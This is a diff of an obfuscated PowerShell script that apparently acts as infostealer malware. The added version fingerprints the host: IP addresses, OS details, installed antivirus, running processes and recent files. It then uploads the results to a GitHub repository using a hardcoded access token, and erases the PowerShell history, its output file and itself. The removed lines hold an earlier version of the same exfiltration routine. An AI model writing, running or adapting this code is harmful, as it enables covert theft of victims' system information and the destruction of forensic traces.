@@ -1,36 +1,66 @@
-$fgdfgjsdg = "sdvgspdjgp_)V;'sdv;sdvlmfbmcgmdfmbpm[spf[pl[qwf$#*(^U(JBGIdfbdbdbSNf"
-$Cisvoisvfosdnogfer = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null }).IPAddress[0];
-$dnifsedgoreger = (Resolve-DnsName myip.opendns.com -Server resolver1.opendns.com).IP4Address;
-$dbvfbmdofnmsdg = Get-Date -Format "MMdd_HHmm"
-$fgdfgjsdg = "sdvgspdjgp_)V;'sdv;sdvlmfbmcgmdfmbpm[spf[pl[qwf$#*(^U(JBGIdfbdbdbSNf"
-$CVVbosdfigoisdrgvlx = "$dnifsedgoreger-$Cisvoisvfosdnogfer-$dbvfbmdofnmsdg-XXX-kkk.txt"
-$fgdfgjsdg = "sdvgspdjgp_)V;'sdv;sdvlmfbmcgmdfmbpm[spf[pl[qwf$#*(^U(JBGIdfbdbdbSNf"
-$CVsdovcmsdmsdfsfr = Join-Path $env:appdata $CVVbosdfigoisdrgvlx
-$fgdfgjsdg = "sdvgspdjgp_)V;'sdv;sdvlmfbmcgmdfmbpm[spf[pl[qwf$#*(^U(JBGIdfbdbdbSNf"
-(Get-CimInstance Win32_OperatingSystem).LastBootUpTime | Out-File -FilePath $CVsdovcmsdmsdfsfr
-$fgdfgjsdg = "sdvgspdjgp_)V;'sdv;sdvlmfbmcgmdfmbpm[spf[pl[qwf$#*(^U(JBGIdfbdbdbSNf"
-$NNOSIjvodvfsd = $CVsdovcmsdmsdfsfr
+$sdjkvwe4KIVUIWr= "asdfdgtrBGONJOUFOAISFAwefsdjkghjkldshgjkldhsgjkdshgjkhkjfgl;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh";
+$BBBBSfeIGwfbzxvde = Join-Path $env:AppData "Microsoft";
+$pqwojfncbf= "asdfdgtrBGONJOUFOAISFAwefsdjkghjkldshgjkldhsgjkdshgjkhkjfgl;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh";
+$dhfjkg= "sdjkghjkldshgjkldhsgjkdshgjkhkjfgl;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh";
+$GGGLKNWSVs = "gh"+"p_r"+"7wLdbb"+"5F"+"1xW"+"VFgq"+"Hygy"+"iGM"+"1W"+"at"+"sm9"+"4DK"+"A"+"si"
 
-$AAAPofkef = "htt"+"ps"+":/"+"/a" + "pi.g" + "ith" + "ub.com/re" + "pos/Dbaras6600/ioernuty/contents/report/" + $CVVbosdfigoisdrgvlx
-$VVPOKMSKCskmcsdcsd = "gh"+"p_r"+"7wLdbb"+"5F"+"1xW"+"VFgq"+"Hygy"+"iGM"+"1W"+"at"+"sm9"+"4DK"+"A"+"si"
+$derrhfjkg= "sdjkdgdgdgghjkldshgjkldhsgjkdshgjkhkjfgl;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh";
+$bvfdbdfgfhthder = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null }).IPAddress[0];
+$ldfjgvodsrtgry = (Resolve-DnsName myip.opendns.com -Server resolver1.opendns.com).IP4Address;
+$VVVSOuhfge = Get-Date -Format "MMdd_HHmm"
+$MMMOjeigfseg = "$ldfjgvodsrtgry-$bvfdbdfgfhthder-$VVVSOuhfge-info.txt"
 
-$ttttpp = $env:APPDATA
-$sdvdfbfghfgh = Get-Content -Path $NNOSIjvodvfsd -Encoding Byte
-$sdvdfbfghfghBase64 = [Convert]::ToBase64String($sdvdfbfghfgh)
-$fgdfgjsdg = "sdvgspdjgp_)V;'sdv;sdvlmfbmcgmdfmbpm[spf[pl[qwf$#*(^U(JBGIdfbdbdbSNf"
-$body = @{
-    message = "Upload file $CVVbosdfigoisdrgvlx"
-    content = $sdvdfbfghfghBase64
+$UUUISUbvieifvg = Join-Path $BBBBSfeIGwfbzxvde $MMMOjeigfseg;
+if ([System.IO.File]::Exists($UUUISUbvieifvg)) {remove-item $UUUISUbvieifvg -Force -Recurse -ErrorAction SilentlyContinue;}
+$sdlvgnodrhgwerf= "pnobpsdpmsskjdbvasdegf;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh";
+(Get-CimInstance Win32_OperatingSystem).LastBootUpTime | Out-File -FilePath $UUUISUbvieifvg;
+$dflbnosodfihtrg= "asdfdgtrBGONJOUFOAISFAwefsdjkghjkldshgjkldhsgjkdshgjkhkjfgl;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh";
+(Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber, OSArchitecture) | Out-File -FilePath $UUUISUbvieifvg -Append;
+$OOBNrdtr= "asdfdgtrBGONJOUFOAISFAwefsdjkghjkldshgjkldhsgjkdshgjkhkjfgl;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh";
+Get-WmiObject -Class Win32_ComputerSystem | Out-File -FilePath $UUUISUbvieifvg -Append;
+$sdnfvoisodgerg= "sdvsongienflavocdnvosdeg;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh";
+if ((Get-WmiObject -Class Win32_ComputerSystem).PCSystemType -eq 2) {
+    Write-Output "Note" | Out-File -FilePath $UUUISUbvieifvg -Append;
+} else {
+    Write-Output "Desk" | Out-File -FilePath $UUUISUbvieifvg -Append;
+}
+$sdfokpqwjocvfrg= "nkspdnibvpsndpfe;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh";
+(Get-WmiObject Win32_OperatingSystem).InstallDate | Out-File -FilePath $UUUISUbvieifvg -Append;
+$sdvlosnopdfibdefr= "wefwefpowjpovpdmfvpsd;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh";
+(Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct).displayName | Out-File -FilePath $UUUISUbvieifvg -Append;
+
+$NNMTWdiwfb = Get-Process
+$NNMTWdiwfb | Out-File -FilePath $UUUISUbvieifvg -Append
+
+$rc = Get-ChildItem ([Environment]::GetFolderPath('Recent'))
+$rc | Out-File -FilePath $UUUISUbvieifvg -Append
+
+$outputFile = Split-Path $UUUISUbvieifvg -leaf
+$drtethfjkg= "1243435sdjkghjkldshgjkldhsgjkdshgjkhkjfgl;kjklddsgdgdsgesgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh";
+$QQQMMNVUghwergtrg = "htt"+"ps"+":/"+"/a" + "pi.g" + "ith" + "ub.com/re" 
+
+$trtdhfjkg= "sdjkghjkldshgjkldhsgjkdshgjkhkjffght234243gl;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh";
+$QQQMMNVUghwergtrg += "pos/Dbaras6600/ioernuty/contents/report/" + $MMMOjeigfseg
+$blonsdopnvgrg = Get-Content -Path $UUUISUbvieifvg  -Encoding Byte
+$fileContentBase64 = [Convert]::ToBase64String($blonsdopnvgrg)
+
+$PJOEDNgr = @{
+    message = "Upload file $MMMOjeigfseg"
+    content = $fileContentBase64
     branch = "main"
 }
-$headers = @{
-    "Authorization" = "token $VVPOKMSKCskmcsdcsd"
-    "Content-Type" = "application/json"
-}
+
+$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+$headers.Add("Authorization", "token $GGGLKNWSVs")
+$headers.Add("Content-Type", 'application/json')
 
 
-$response = Invoke-RestMethod -Uri $AAAPofkef -Method Put -Body ($body | ConvertTo-Json) -Headers $headers;
+$diauyadsf = "djdaidjaid"
+$diaahah = "1818adjfiasdjif"
+$djaijd = 190298312838123
+
+Invoke-RestMethod -Uri $QQQMMNVUghwergtrg -Method Put -Body ($PJOEDNgr | ConvertTo-Json) -Headers $headers;
 $his = $env:appdata + "\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";
 Remove-Item -Path $his -Force;
-Remove-Item -Path $CVsdovcmsdmsdfsfr -Force;
+Remove-Item -Path $UUUISUbvieifvg;
 Remove-Item -Path $MyInvocation.MyCommand.Path -Force;
